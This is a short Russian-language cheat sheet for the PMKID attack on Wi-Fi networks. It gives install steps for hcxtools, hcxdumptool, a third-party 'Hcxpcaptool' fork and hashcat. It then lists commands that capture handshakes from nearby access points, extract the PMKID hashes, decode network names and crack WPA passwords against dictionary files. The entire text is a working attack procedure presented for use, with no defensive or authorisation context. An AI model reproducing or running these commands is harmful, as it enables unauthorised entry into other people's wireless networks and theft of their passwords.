Установка
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
apt-get install pkg-config libcurl4-openssl-dev libssl-dev zlib1g-dev
make
make install (as super user)
cd ..

git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool
make
make install
cd ..

https://github.com/warecrer/Hcxpcaptool.git
cd Hcxpcaptool
apt install curl libpcap-dev
make
make install
cd ..

apt install hashcat


Атака
hcxdumptool -i <interface> -c <channel> -o dump.pcapng --enable_status=15
hcxpcaptool -z <output file> dump.pcapng
hashcat --session=pmkid --status --force -m 16800 <file> -a 0 -w 4 <dict1> <dict2> ...
or 
hashcat.exe --session=pmkid --status --force -m 16800 <file> -a 0 -w 4 <dict1> <dict2> ...

Просмотреть имя точки по хешу
echo <последняя часть строки из файла> | xxd -r -p

hcxpcaptool -E essidlist -I identitylist -U usernamelist -o galleriaHC.16800 galleria.pcapng
hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'
